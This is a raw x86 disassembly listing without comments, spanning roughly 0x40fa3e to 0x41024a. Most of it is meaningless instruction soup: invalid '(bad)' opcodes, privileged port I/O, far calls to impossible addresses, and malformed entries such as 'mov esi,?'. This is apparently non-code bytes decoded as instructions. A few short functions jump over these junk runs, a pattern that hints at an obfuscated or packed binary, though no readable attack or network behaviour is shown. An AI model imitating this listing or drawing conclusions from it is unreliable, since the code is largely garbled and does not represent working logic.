  40fa3e:	call   0x910bbc26
  40fa43:	xlat   BYTE PTR fs:[ebx]
  40fa45:	test   DWORD PTR [ecx+0x6e],edx
  40fa48:	jl     0x40fa93
  40fa4a:	and    cl,BYTE PTR [edx]
  40fa4c:	xor    DWORD PTR [ebp-0x482377d5],eax
  40fa52:	pop    ds
  40fa53:	pop    ds
  40fa54:	in     eax,0xb
  40fa56:	or     esi,ecx
  40fa58:	push   edi
  40fa59:	in     al,dx
  40fa5a:	sbb    BYTE PTR [edi],ah
  40fa5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fa5d:	std    
  40fa5e:	mov    cl,0x1e
  40fa60:	xor    esp,esi
  40fa62:	test   BYTE PTR [eax+ecx*4-0x15],ah
  40fa66:	xor    eax,0xd2f160c8
  40fa6b:	test   eax,0xb4e3c1ec
  40fa70:	mov    al,0xb4
  40fa72:	leave  
  40fa73:	fsubr  QWORD PTR [esi+esi*1]
  40fa76:	pusha  
  40fa77:	mov    eax,0xceb396
  40fa7c:	fninit 
  40fa7e:	pop    es
  40fa7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fa80:	mov    ch,0x1c
  40fa82:	jbe    0x40fa2a
  40fa84:	cwde   
  40fa85:	sub    esi,esi
  40fa87:	sbb    BYTE PTR [ebp+0x738c6a59],al
  40fa8d:	or     al,0xa4
  40fa8f:	push   ebp
  40fa90:	in     eax,0xe0
  40fa92:	cdq    
  40fa93:	ret    
  40fa94:	push   esi
  40fa95:	daa    
  40fa96:	add    DWORD PTR [ebp-0x44],ebx
  40fa99:	loope  0x40fa8a
  40fa9b:	adc    al,0x30
  40fa9d:	xor    esp,DWORD PTR [ecx-0x56]
  40faa0:	aas    
  40faa1:	sar    dl,1
  40faa3:	dec    esi
  40faa4:	mov    ch,0xb7
  40faa6:	jle    0x40fa99
  40faa8:	xchg   ebp,eax
  40faa9:	gs in  al,dx
  40faab:	arpl   WORD PTR [esi-0x1e],ax
  40faae:	(bad)  
  40faaf:	bound  eax,QWORD PTR [esi-0x3ec95697]
  40fab5:	(bad)  
  40fab6:	loope  0x40fb26
  40fab8:	inc    ebp
  40fab9:	ds mov ebx,0x5c73313d
  40fabf:	push   ebx
  40fac0:	int3   
  40fac1:	test   DWORD PTR [esi-0x37303006],edi
  40fac7:	jge    0x40faea
  40fac9:	mov    edi,0xbd046df5
  40face:	push   cs
  40facf:	sbb    DWORD PTR [ecx-0x20a90ba1],edi
  40fad5:	sbb    BYTE PTR [ecx],bl
  40fad7:	xchg   ebp,eax
  40fad8:	(bad)  
  40fad9:	push   edx
  40fada:	(bad)  
  40fadb:	mov    dl,0xe4
  40fadd:	cs cdq 
  40fadf:	clc    
  40fae0:	adc    esp,DWORD PTR [ebx+0x5f49247]
  40fae6:	icebp  
  40fae7:	stc    
  40fae8:	(bad)  
  40fae9:	fild   QWORD PTR [edx]
  40faeb:	adc    al,0xc7
  40faed:	rcr    DWORD PTR ds:0x7612cb28,cl
  40faf3:	mov    al,ds:0x45574368
  40faf8:	or     al,0xc7
  40fafa:	faddp  st(7),st
  40fafc:	gs xchg ebp,eax
  40fafe:	dec    esp
  40faff:	xchg   esi,eax
  40fb00:	xchg   ebp,eax
  40fb01:	adc    eax,0x8ae66604
  40fb06:	xchg   ebx,eax
  40fb07:	popa   
  40fb08:	xor    al,0xb3
  40fb0a:	in     eax,dx
  40fb0b:	mov    BYTE PTR [esi+0x5552495a],al
  40fb11:	fidivr WORD PTR [ecx]
  40fb13:	dec    esp
  40fb14:	mov    esp,0x20862f40
  40fb19:	mov    BYTE PTR [edx],0x2f
  40fb1c:	xchg   edx,eax
  40fb1d:	aam    0xbf
  40fb1f:	test   eax,0xdddf2bfb
  40fb24:	and    ebx,DWORD PTR [esi+0x5e361fa2]
  40fb2a:	retf   
  40fb2b:	dec    ebp
  40fb2c:	dec    esi
  40fb2d:	call   0xf57b:0xb4ec5b19
  40fb34:	rdtsc  
  40fb36:	or     dl,dh
  40fb38:	fmul   QWORD PTR [bx+si+0x3d]
  40fb3c:	pop    ecx
  40fb3d:	and    DWORD PTR [eax+0x2530c805],esi
  40fb43:	pop    eax
  40fb44:	test   DWORD PTR [eax],edi
  40fb46:	dec    eax
  40fb47:	sbb    cl,cl
  40fb49:	xor    cl,BYTE PTR [ecx+0x1df2393]
  40fb4f:	adc    edx,DWORD PTR [ebp+0x4590d3b5]
  40fb55:	scas   al,BYTE PTR es:[edi]
  40fb56:	loop   0x40fb7f
  40fb58:	fild   WORD PTR [ebx+0x4c]
  40fb5b:	pusha  
  40fb5c:	sbb    BYTE PTR [edi],cl
  40fb5e:	add    ebp,DWORD PTR ds:0x56467611
  40fb64:	dec    eax
  40fb65:	imul   ebx,ecx,0x3cef9a48
  40fb6b:	xchg   esi,eax
  40fb6c:	mov    ebx,edx
  40fb6e:	cwde   
  40fb6f:	cwde   
  40fb70:	popa   
  40fb71:	cmp    esi,DWORD PTR [esi-0x5ea515fa]
  40fb77:	add    al,0x56
  40fb79:	or     bh,BYTE PTR [esi-0x39d7b351]
  40fb7f:	sbb    al,0xf2
  40fb81:	push   0xc4348eda
  40fb86:	std    
  40fb87:	and    edi,DWORD PTR [ecx]
  40fb89:	in     al,dx
  40fb8a:	push   esi
  40fb8b:	(bad)  
  40fb8c:	jge    0x40fbd5
  40fb8e:	mov    edx,0xe60cb68f
  40fb93:	in     eax,dx
  40fb94:	mov    eax,ds:0x350f9a0d
  40fb99:	fimul  DWORD PTR [esi+0x39c4c3da]
  40fb9f:	cli    
  40fba0:	mov    bl,0x8a
  40fba2:	jbe    0x40f521
  40fba8:	pop    ebx
  40fba9:	mov    eax,0xf89c8532
  40fbae:	pop    edi
  40fbaf:	pop    esi
  40fbb0:	leave  
  40fbb1:	ret    0xc
  40fbb4:	push   ebp
  40fbb5:	mov    ebp,esp
  40fbb7:	jmp    0x40fed6
  40fbbc:	shl    DWORD PTR [esi-0x168e14bc],cl
  40fbc2:	jno    0x40fb6a
  40fbc4:	aad    0xf
  40fbc6:	xor    ebx,0xffffff9c
  40fbc9:	inc    edx
  40fbca:	(bad)  
  40fbcb:	jmp    0x7ebfb2a0
  40fbd0:	jl     0x40fc4f
  40fbd2:	jle    0x40fc52
  40fbd4:	sub    edi,DWORD PTR [esi+0x62401f42]
  40fbda:	mov    edx,0x166ffc60
  40fbdf:	xchg   edi,esi
  40fbe1:	packsswb mm5,mm6
  40fbe4:	sbb    al,0x1a
  40fbe6:	rol    BYTE PTR [edx-0x74],0x17
  40fbea:	adc    eax,0x8e5f40ae
  40fbef:	mov    ebx,0x380a043d
  40fbf4:	add    DWORD PTR [edi-0x61b13313],ebx
  40fbfa:	jae    0x40fc03
  40fbfc:	xchg   esp,eax
  40fbfd:	pop    ss
  40fbfe:	sar    DWORD PTR [edi+0x361c3e28],cl
  40fc04:	adc    eax,0xf1c56428
  40fc09:	adc    al,0xb1
  40fc0b:	mov    eax,DWORD PTR [edx+0x57]
  40fc0e:	mov    ebp,0x9f7abf93
  40fc13:	xor    DWORD PTR [edi+0x52484308],edx
  40fc19:	retf   
  40fc1a:	je     0x40fc91
  40fc1c:	sbb    al,0xde
  40fc1e:	imul   edi,DWORD PTR [ebp+0x57],0xffffffef
  40fc22:	sub    eax,0x877e3543
  40fc27:	pushf  
  40fc28:	lahf   
  40fc29:	mov    cl,0xec
  40fc2b:	dec    edi
  40fc2c:	jno    0x40fbf7
  40fc2e:	mov    WORD PTR [ebp-0x69522fe],fs
  40fc34:	cmp    DWORD PTR [edi+0x311cfab3],edi
  40fc3a:	test   DWORD PTR [edx-0x17],ecx
  40fc3d:	rcr    BYTE PTR [esi+0x6c0833d7],0x3a
  40fc44:	fisub  DWORD PTR [edx+0x7b1371e5]
  40fc4a:	add    esi,DWORD PTR [ecx+0x60]
  40fc4d:	cmp    al,0x29
  40fc4f:	fild   QWORD PTR [edx+0x3b8e636a]
  40fc55:	push   eax
  40fc56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc57:	sub    al,0x4b
  40fc59:	aas    
  40fc5a:	loope  0x40fcb6
  40fc5c:	aad    0x1
  40fc5e:	and    DWORD PTR [eax-0x40c3226f],eax
  40fc64:	gs jns 0x40fc27
  40fc67:	cmp    bh,BYTE PTR [esi+0x4cbf4c08]
  40fc6d:	loope  0x40fc82
  40fc6f:	mov    edx,DWORD PTR [ecx+eax*8-0x72]
  40fc73:	jnp    0x40fc44
  40fc75:	mov    ecx,0x8105b855
  40fc7a:	or     DWORD PTR [eax-0x29cebc15],0xff762a1f
  40fc84:	test   DWORD PTR [ebx-0x4a],0x661105d8
  40fc8b:	push   cs
  40fc8c:	mov    ecx,0x6dd0cd94
  40fc91:	leave  
  40fc92:	sbb    al,0x81
  40fc94:	sub    bh,BYTE PTR cs:[ebx+0x572192a3]
  40fc9b:	(bad)  [edx+0x40]
  40fc9e:	push   cs
  40fc9f:	popf   
  40fca0:	xchg   BYTE PTR [ebx+0x788f6601],dl
  40fca6:	mov    fs,WORD PTR ds:0x89c79a71
  40fcac:	pop    ds
  40fcad:	cwde   
  40fcae:	cmc    
  40fcaf:	shr    ah,1
  40fcb1:	loop   0x40fd1a
  40fcb3:	or     eax,0x11eeadcf
  40fcb8:	lock int 0xaa
  40fcbb:	xchg   esp,eax
  40fcbc:	mov    eax,ds:0xcc68c7ff
  40fcc1:	xchg   esi,eax
  40fcc2:	and    dl,0xd6
  40fcc5:	stc    
  40fcc6:	popf   
  40fcc7:	xchg   esp,eax
  40fcc8:	dec    ecx
  40fcc9:	jae    0x40fc93
  40fccb:	(bad)  [ecx+0x4f44bf61]
  40fcd1:	cmp    dh,BYTE PTR [ecx+0x1f]
  40fcd4:	icebp  
  40fcd5:	adc    eax,0x63f16635
  40fcda:	out    dx,al
  40fcdb:	add    edx,DWORD PTR [ebp+0x2aa0a67f]
  40fce1:	mov    eax,ds:0xd545d5db
  40fce6:	bound  edx,QWORD PTR [ebx-0x78]
  40fce9:	and    esp,DWORD PTR [ecx-0x2be1ced3]
  40fcef:	aaa    
  40fcf0:	shl    BYTE PTR [ebp+0x67c7c97e],1
  40fcf6:	pop    ebp
  40fcf7:	(bad)  
  40fcf8:	fstp   QWORD PTR [edi+esi*8]
  40fcfb:	mov    ebp,0x87c7bedb
  40fd00:	jne    0x40fd01
  40fd02:	xchg   BYTE PTR [edi+0x1364b91a],dl
  40fd08:	cmp    DWORD PTR [edi-0x4b],ecx
  40fd0b:	fst    st(3)
  40fd0d:	jns    0x40fd32
  40fd0f:	push   0x1a
  40fd11:	aas    
  40fd12:	jmp    0x3dea:0xb6032d16
  40fd19:	dec    esi
  40fd1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fd1b:	add    esi,0x65
  40fd1e:	mov    eax,0xa2773e96
  40fd23:	mov    esp,DWORD PTR [edi+0x5b]
  40fd26:	or     BYTE PTR [ebp+esi*4+0x737df231],dl
  40fd2d:	das    
  40fd2e:	inc    esi
  40fd2f:	mov    cl,0x44
  40fd31:	(bad)  
  40fd32:	fdivr  st(0),st
  40fd34:	jno    0x40fd1a
  40fd36:	ffreep st(7)
  40fd38:	dec    edx
  40fd39:	mov    ebp,0x994c7418
  40fd3e:	inc    esi
  40fd3f:	cmp    DWORD PTR [eax-0x64],0x907ee119
  40fd46:	jmp    0x40fcc9
  40fd48:	or     al,dl
  40fd4a:	sbb    eax,0xe936fca1
  40fd4f:	inc    esi
  40fd50:	call   0xa3f:0xf91f5a45
  40fd57:	cdq    
  40fd58:	inc    esp
  40fd59:	inc    edi
  40fd5a:	cdq    
  40fd5b:	add    al,0xad
  40fd5d:	arpl   WORD PTR [edi+0x7f05d6c9],bp
  40fd63:	jg     0x40fd24
  40fd65:	cmp    DWORD PTR [edx-0x2701ff47],ecx
  40fd6b:	sub    eax,0x5997ad11
  40fd70:	pop    ss
  40fd71:	mov    ecx,0x3ed04e7
  40fd76:	ror    DWORD PTR [ebp+0x31],1
  40fd79:	add    bh,bl
  40fd7b:	mov    ah,0xd7
  40fd7d:	push   ebx
  40fd7e:	pop    edi
  40fd7f:	mov    bl,0xfb
  40fd81:	inc    ecx
  40fd82:	(bad)  
  40fd83:	test   al,0x1d
  40fd85:	retf   
  40fd86:	jge    0x40fd83
  40fd88:	sbb    ebx,DWORD PTR [edi+0x1]
  40fd8b:	cs in  al,dx
  40fd8d:	sub    BYTE PTR [edx],cl
  40fd8f:	imul   ebx,DWORD PTR [ebp+0x4db5f844],0xd833cad0
  40fd99:	sbb    esp,DWORD PTR [eax]
  40fd9b:	fdiv   DWORD PTR [eax+0x10]
  40fd9e:	(bad)  
  40fd9f:	inc    edi
  40fda0:	imul   esp,DWORD PTR [edi-0xcea5ff9],0x672c13fb
  40fdaa:	push   0xea11ea8d
  40fdaf:	(bad)  
  40fdb0:	sub    eax,0x6cae97ca
  40fdb5:	(bad)  
  40fdb6:	in     al,dx
  40fdb7:	or     dh,ch
  40fdb9:	popa   
  40fdba:	dec    ebx
  40fdbb:	sbb    al,0x72
  40fdbd:	cwde   
  40fdbe:	(bad)  
  40fdc0:	mov    WORD PTR [ecx+ebp*1],cs
  40fdc3:	sbb    dh,bh
  40fdc5:	stc    
  40fdc6:	sub    BYTE PTR [eax],bh
  40fdc8:	fs enter 0xe936,0x81
  40fdcd:	cmc    
  40fdce:	pop    ebx
  40fdcf:	mov    al,0x83
  40fdd1:	lahf   
  40fdd2:	mov    bl,0xac
  40fdd4:	adc    eax,DWORD PTR [ecx+0x5e]
  40fdd7:	xor    ebp,DWORD PTR [edx+0x2c]
  40fdda:	dec    esp
  40fddb:	test   eax,0xedede5a1
  40fde0:	lahf   
  40fde1:	dec    edx
  40fde2:	out    0x38,al
  40fde4:	jns    0x40fdcf
  40fde6:	cs ins BYTE PTR es:[edi],dx
  40fde8:	jae    0x40fd80
  40fdea:	or     BYTE PTR [edi+eax*2],0x89
  40fdee:	test   al,0x8a
  40fdf0:	cmp    DWORD PTR [edx+ebp*4-0x22],0x1b
  40fdf5:	push   edx
  40fdf6:	sbb    esp,DWORD PTR [ecx+0x20]
  40fdf9:	sbb    al,ah
  40fdfb:	dec    ebp
  40fdfc:	ficom  WORD PTR [esi+0x5fd70155]
  40fe02:	ds pushf 
  40fe04:	inc    edi
  40fe05:	push   eax
  40fe06:	in     al,dx
  40fe07:	pop    ss
  40fe08:	and    edi,DWORD PTR [eax+0x6f]
  40fe0b:	jns    0x40fda5
  40fe0d:	ret    0x8a9d
  40fe10:	scas   eax,DWORD PTR es:[edi]
  40fe11:	cmp    BYTE PTR cs:[edx+0x48],dl
  40fe15:	test   ah,ch
  40fe17:	test   al,0xd9
  40fe19:	call   0x5e1d:0x3b2766f3
  40fe20:	jle    0x40fe48
  40fe22:	enter  0x180a,0x8a
  40fe26:	enter  0xf443,0x6e
  40fe2a:	ins    BYTE PTR es:[edi],dx
  40fe2b:	mov    dh,0x2
  40fe2d:	xor    ecx,esi
  40fe2f:	mov    ds:0xff132eff,al
  40fe34:	mov    eax,ds:0x7a5b60e2
  40fe39:	(bad)  
  40fe3a:	dec    esp
  40fe3b:	je     0x40fe7f
  40fe3d:	mov    BYTE PTR [eax-0x2e],bl
  40fe40:	cwde   
  40fe41:	pop    esp
  40fe42:	push   esi
  40fe43:	icebp  
  40fe44:	sbb    DWORD PTR [esi-0x4502fe1f],edx
  40fe4a:	push   ss
  40fe4b:	fbstp  TBYTE PTR [esi]
  40fe4d:	fdiv   QWORD PTR [ebx-0x4e]
  40fe50:	jmp    0x1d87438c
  40fe55:	pop    esp
  40fe56:	cs hlt 
  40fe58:	cli    
  40fe59:	adc    cl,dl
  40fe5b:	dec    ebx
  40fe5c:	mov    ecx,0x574f83c6
  40fe61:	sub    ecx,DWORD PTR [esi]
  40fe63:	mov    bl,dl
  40fe65:	fisttp QWORD PTR [ebx+edi*2+0x53]
  40fe69:	sbb    ebp,DWORD PTR [ecx+0x1ca531dd]
  40fe6f:	add    al,0x93
  40fe71:	pushf  
  40fe72:	xchg   ebp,eax
  40fe73:	aas    
  40fe74:	test   DWORD PTR [esi+edi*2],ecx
  40fe77:	hlt    
  40fe78:	test   eax,0x1c0ae156
  40fe7d:	aam    0xa4
  40fe7f:	push   es
  40fe80:	stos   BYTE PTR es:[edi],al
  40fe81:	arpl   WORD PTR [eax],si
  40fe83:	shl    BYTE PTR [ebp-0x69],0xe1
  40fe87:	or     al,0x3a
  40fe89:	xor    eax,0xc6336705
  40fe8e:	jp     0x40fe12
  40fe90:	push   edx
  40fe91:	sar    BYTE PTR [edx-0x77],cl
  40fe94:	xchg   esp,eax
  40fe95:	mov    DWORD PTR [esp+ebp*2+0x215ef68d],esi
  40fe9c:	dec    ecx
  40fe9d:	mov    BYTE PTR [ebx],bl
  40fe9f:	xor    eax,0x4b3aa747
  40fea4:	xor    eax,0x3c1701f8
  40fea9:	nop
  40feaa:	sub    ebp,DWORD PTR fs:[ecx]
  40fead:	sub    ebx,esi
  40feaf:	arpl   WORD PTR ds:0x5f2d1ba3,bp
  40feb5:	dec    esi
  40feb6:	xor    al,0xb8
  40feb8:	sub    BYTE PTR [esi+0x39863f55],dh
  40febe:	push   ebx
  40febf:	fwait
  40fec0:	js     0x40fe82
  40fec2:	xchg   ecx,eax
  40fec3:	scas   eax,DWORD PTR es:[edi]
  40fec4:	adc    ch,BYTE PTR [esi]
  40fec6:	adc    ch,ch
  40fec8:	push   es
  40fec9:	mov    ss,WORD PTR [ecx-0x4a705fc]
  40fecf:	lds    ecx,FWORD PTR [esi-0x72]
  40fed2:	pop    ss
  40fed3:	or     cl,BYTE PTR [edx-0x42]
  40fed6:	mov    eax,DWORD PTR [ebp+0xc]
  40fed9:	xor    edx,edx
  40fedb:	mov    ecx,0x7264fca9
  40fee0:	jmp    0x4101ff
  40fee5:	or     eax,0xf19cc125
  40feea:	pop    eax
  40feeb:	jno    0x40fea2
  40feed:	xchg   ecx,eax
  40feee:	add    eax,0x5f2b4346
  40fef3:	ss mov bl,0xde
  40fef6:	mov    ch,0x7e
  40fef8:	jle    0x40ff76
  40fefa:	jge    0x40ff7a
  40fefc:	jle    0x40ff25
  40fefe:	mov    ebp,0xaf2bfb88
  40ff03:	aaa    
  40ff04:	jns    0x40fe8d
  40ff06:	mov    esi,?
  40ff08:	cmp    BYTE PTR [eax+0x42ae5b96],bl
  40ff0e:	fild   DWORD PTR [edi-0x1c]
  40ff11:	ss mov ebx,0x8b171c0a
  40ff17:	les    eax,FWORD PTR [ecx+ecx*8]
  40ff1a:	inc    ebx
  40ff1b:	call   0xc3992f12
  40ff20:	push   es
  40ff21:	xchg   bl,cl
  40ff23:	std    
  40ff24:	adc    dl,dl
  40ff26:	mov    al,0x4d
  40ff28:	sbb    ch,BYTE PTR gs:[ebp-0x5752ad2c]
  40ff2f:	test   DWORD PTR [esi+0x7f94e31b],0x836ce52
  40ff39:	fsubr  QWORD PTR [eax]
  40ff3b:	ret    0x2af4
  40ff3e:	fwait
  40ff3f:	add    eax,ebx
  40ff41:	xor    BYTE PTR [ebp+0x5f],cl
  40ff44:	ror    BYTE PTR [ebx],cl
  40ff46:	div    BYTE PTR [ebp-0x1bee13e3]
  40ff4c:	jmp    0x8c47:0x6db5adf0
  40ff53:	cmp    BYTE PTR [edi-0x4a],al
  40ff56:	fndisi(8087 only) 
  40ff58:	dec    esp
  40ff59:	xchg   edx,eax
  40ff5a:	lds    edi,FWORD PTR [edi]
  40ff5c:	aad    0xd8
  40ff5e:	sbb    eax,0xb24f6090
  40ff63:	cmp    BYTE PTR [edx+0x70],0xa3
  40ff67:	test   edx,0xfcb8d0ad
  40ff6d:	daa    
  40ff6e:	int    0x81
  40ff70:	or     eax,0x9409c9ec
  40ff75:	(bad)  [edx]
  40ff77:	loop   0x40feff
  40ff79:	dec    edi
  40ff7a:	adc    bl,al
  40ff7c:	xchg   ebx,eax
  40ff7d:	rcr    BYTE PTR [edx-0x1b],0x8a
  40ff81:	mov    dh,0x91
  40ff83:	push   ecx
  40ff84:	xor    BYTE PTR [edx],al
  40ff86:	xchg   esp,eax
  40ff87:	dec    ecx
  40ff88:	pop    edi
  40ff89:	mov    dl,0x79
  40ff8b:	js     0x40ffad
  40ff8d:	mov    ebp,0xae640e73
  40ff92:	shr    DWORD PTR [eax],0x6e
  40ff95:	mov    DWORD PTR [ebp-0x4b48aa96],ecx
  40ff9b:	mov    edx,0x1f64c853
  40ffa0:	mov    esp,0x8c418ea6
  40ffa5:	bts    DWORD PTR [ecx-0x469add76],esp
  40ffac:	mov    dl,0x26
  40ffae:	imul   edi,DWORD PTR [eax-0x3895a895],0x53
  40ffb5:	and    eax,0xd760892d
  40ffba:	icebp  
  40ffbb:	iret   
  40ffbc:	(bad)  
  40ffbe:	push   ebp
  40ffbf:	cdq    
  40ffc0:	shr    BYTE PTR [ebx+0x29],0x70
  40ffc4:	pop    ebp
  40ffc5:	stos   DWORD PTR es:[edi],eax
  40ffc6:	pop    edi
  40ffc7:	test   DWORD PTR [ebx-0x3a],ebp
  40ffca:	push   ss
  40ffcb:	mov    fs,WORD PTR [esi]
  40ffcd:	(bad)  [ecx-0x58817d01]
  40ffd3:	test   al,0xa0
  40ffd5:	test   al,0xf3
  40ffd7:	mov    bh,0x80
  40ffd9:	sub    ebp,DWORD PTR [eax+0x343b0de]
  40ffdf:	cmp    esi,edx
  40ffe1:	and    eax,0x86277854
  40ffe6:	in     al,dx
  40ffe7:	shl    BYTE PTR [ebp-0x75],0x8e
  40ffeb:	xchg   edi,eax
  40ffec:	mov    ebp,0x409f761a
  40fff1:	daa    
  40fff2:	xlat   BYTE PTR ds:[ebx]
  40fff3:	(bad)  
  40fff4:	mov    ecx,0xcd9d4ef
  40fff9:	sbb    dh,BYTE PTR [ebp+0x7bf5268f]
  40ffff:	pextrw edx,(bad),0xc5
  410001:	push   esp
  410002:	ss loopne 0x40ffbb
  410005:	aad    0xf6
  410007:	xchg   ebx,eax
  410008:	pop    ebp
  410009:	adc    eax,0xf7f1aa8a
  41000e:	mov    al,ds:0xa526a138
  410013:	loopne 0x40ffd4
  410015:	ror    DWORD PTR [ebx+0x79c9e740],cl
  41001b:	sahf   
  41001c:	pop    edx
  41001d:	mov    ebp,0x7f7d4599
  410022:	fisub  DWORD PTR [eax+edx*4]
  410025:	or     cl,cl
  410027:	pop    es
  410028:	add    BYTE PTR [edi+0x5baf83a6],dh
  41002e:	cmp    al,dh
  410030:	imul   ecx,DWORD PTR [edx+edx*8+0x6a],0xffffffaf
  410035:	inc    eax
  410036:	jmp    0x4036:0x55e65b1c
  41003d:	xchg   DWORD PTR [ebp+0x1c37a09e],edx
  410043:	lds    ecx,FWORD PTR [eax]
  410045:	xchg   ch,dh
  410047:	jnp    0x41006d
  410049:	leave  
  41004a:	and    ch,BYTE PTR [ebp+edx*1+0x73]
  41004e:	in     eax,dx
  41004f:	mov    esi,0x2d01d21b
  410054:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410055:	ds pop ecx
  410057:	fldcw  WORD PTR [eax+eax*1+0x3d1fe825]
  41005e:	sbb    DWORD PTR [esp+edi*8-0x4e0d1825],esi
  410065:	data16 mov cl,0xf3
  410068:	ins    BYTE PTR es:[edi],dx
  410069:	mov    bl,0xe1
  41006b:	hlt    
  41006c:	push   cs
  41006d:	mov    ds:0x74d63312,eax
  410072:	inc    esi
  410073:	mov    eax,ds:0x4aab334e
  410078:	sbb    eax,0x6735361
  41007d:	loope  0x4100be
  41007f:	ja     0x41001e
  410081:	ficomp DWORD PTR [ebx-0x1de62538]
  410087:	jo     0x41006a
  410089:	retf   0xa12
  41008c:	jmp    0x7fd15562
  410091:	sub    DWORD PTR [ebp-0x42],eax
  410094:	xor    cl,BYTE PTR [ecx]
  410096:	cmp    al,0x9e
  410098:	test   BYTE PTR [esi],dh
  41009a:	ror    BYTE PTR [ebx+0x24],1
  41009d:	jle    0x4100eb
  41009f:	ret    
  4100a0:	mov    edx,0xbdb00e66
  4100a5:	mov    edi,0xd16e41aa
  4100aa:	rol    BYTE PTR [edi+ecx*4-0x560be294],1
  4100b1:	jge    0x410114
  4100b3:	jg     0x410051
  4100b5:	pusha  
  4100b6:	ffree  st(2)
  4100b8:	les    eax,FWORD PTR [ebx-0xd]
  4100bb:	enter  0xf3ac,0xc0
  4100bf:	or     ebp,ecx
  4100c1:	xor    ebp,DWORD PTR [ebp-0x1935fb07]
  4100c7:	adc    edx,DWORD PTR [esi+0x690417ef]
  4100cd:	jno    0x4100d0
  4100cf:	cwde   
  4100d0:	sbb    dl,dh
  4100d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4100d3:	inc    edx
  4100d4:	mov    ch,BYTE PTR [eax-0x5d2ecc97]
  4100da:	(bad)  
  4100db:	jecxz  0x4100b9
  4100dd:	outs   dx,DWORD PTR ds:[esi]
  4100de:	or     esi,DWORD PTR [edi+0x2823bf52]
  4100e4:	add    dh,ch
  4100e6:	sar    DWORD PTR [ebx-0x6cfcf6fe],1
  4100ec:	push   edx
  4100ed:	cli    
  4100ee:	mov    ds:0xbc3cf5cd,eax
  4100f3:	popf   
  4100f4:	adc    al,0x60
  4100f6:	into   
  4100f7:	lea    esp,[edi-0x52b3df54]
  4100fd:	jecxz  0x4100dd
  4100ff:	test   eax,0x8273a3aa
  410104:	cmp    al,BYTE PTR [eax+0x50]
  410107:	mov    dl,BYTE PTR [ecx]
  410109:	adc    ecx,esi
  41010b:	aad    0xdd
  41010d:	mov    al,0xf6
  41010f:	outs   dx,BYTE PTR ds:[esi]
  410110:	jne    0x41013f
  410112:	sub    eax,0x6c71ab1d
  410117:	mov    ebp,0x7e8eca4a
  41011c:	dec    esi
  41011d:	lds    esi,FWORD PTR [eax-0x1bd71cad]
  410123:	retf   
  410124:	call   0x1de6c39f
  410129:	mov    ss,WORD PTR [ebx-0x1e828539]
  41012f:	sbb    eax,ebx
  410131:	js     0x410186
  410133:	push   eax
  410134:	or     DWORD PTR [ecx+0x4d7fc41a],edi
  41013a:	xchg   ebx,eax
  41013b:	mov    esi,0x69b9364f
  410140:	sub    eax,0x9e118759
  410145:	call   0xcb30fc91
  41014a:	fmul   DWORD PTR ds:0x1f0fd6e4
  410150:	inc    edi
  410151:	les    edx,FWORD PTR [esi-0x7a03bffe]
  410157:	std    
  410158:	in     al,0x64
  41015a:	xor    BYTE PTR ds:0x298b188c,dh
  410160:	mov    ah,0xa0
  410162:	mov    ds:0xbb1134c3,eax
  410167:	pop    edx
  410168:	ss scas al,BYTE PTR es:[edi]
  41016a:	mov    ebp,0x7c7912c4
  41016f:	push   ecx
  410170:	leave  
  410171:	scas   eax,DWORD PTR es:[edi]
  410172:	xor    ebx,DWORD PTR [edi]
  410174:	push   esi
  410175:	sbb    eax,0xcceb0d39
  41017a:	out    dx,al
  41017b:	fdivr  DWORD PTR [esi-0x42]
  41017e:	sar    dl,cl
  410180:	adc    BYTE PTR [esi-0x6a],bh
  410183:	scas   eax,DWORD PTR es:[edi]
  410184:	and    eax,0xcf221b9e
  410189:	sbb    al,0xfd
  41018b:	data16 or BYTE PTR [eax-0x497b0ecb],ah
  410192:	imul   esp,DWORD PTR [ebp+eax*4+0x738f0a83],0xffffff8b
  41019a:	dec    edi
  41019b:	mov    dh,0xb5
  41019d:	test   eax,0x44f4da90
  4101a2:	sub    BYTE PTR ds:0x9f53a069,ch
  4101a8:	or     eax,0xcd5f1152
  4101ad:	jnp    0x410153
  4101af:	xchg   ebx,eax
  4101b0:	ror    BYTE PTR [eax],1
  4101b2:	or     cl,cl
  4101b4:	mov    edi,0x4e27e573
  4101b9:	stos   DWORD PTR es:[edi],eax
  4101ba:	bound  esp,QWORD PTR [esp+ebx*1]
  4101bd:	jl     0x4101ad
  4101bf:	shl    BYTE PTR [edx],0x8a
  4101c2:	ja     0x410222
  4101c4:	out    dx,eax
  4101c5:	je     0x4101b5
  4101c7:	dec    esp
  4101c8:	cmc    
  4101c9:	fdivr  st(6),st
  4101cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4101cc:	lock in al,dx
  4101ce:	fnstsw WORD PTR [esi-0x13]
  4101d1:	mov    cl,0x66
  4101d3:	mov    dh,0xda
  4101d5:	and    edx,eax
  4101d7:	loop   0x410172
  4101d9:	js     0x410245
  4101db:	ret    0x5d70
  4101de:	pushf  
  4101df:	jnp    0x41016d
  4101e1:	(bad)  
  4101e2:	pop    edi
  4101e3:	push   ebx
  4101e4:	cld    
  4101e5:	and    eax,0xcbcfaf58
  4101ea:	dec    esi
  4101eb:	mov    bh,0xc9
  4101ed:	or     bh,BYTE PTR [ecx+0x36]
  4101f0:	cdq    
  4101f1:	jb     0x41025e
  4101f3:	js     0x410266
  4101f5:	cmp    al,0xf
  4101f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4101f8:	daa    
  4101f9:	repnz stos DWORD PTR es:[edi],eax
  4101fb:	xchg   DWORD PTR ds:0xf1f7b33b,eax
  410201:	mov    ecx,DWORD PTR [ebp+0x10]
  410204:	and    ecx,eax
  410206:	or     ecx,0x81161d8f
  41020c:	mov    eax,ecx
  41020e:	pop    ebp
  41020f:	ret    0x18
  410212:	push   ebp
  410213:	mov    ebp,esp
  410215:	sub    esp,0x58
  410218:	mov    ecx,DWORD PTR ds:0x43379f
  41021e:	adc    DWORD PTR ds:0x4337d7,ecx
  410224:	mov    ecx,DWORD PTR [ebp+0x8]
  410227:	and    eax,0x4408
  41022c:	mov    eax,0x8a3c
  410231:	xor    ax,WORD PTR [ecx+0x20]
  410235:	sub    ecx,0x2534
  41023b:	mov    ecx,0x3b02
  410240:	or     DWORD PTR ds:0x43370b,0x3241
  41024a:	add    ax,cx
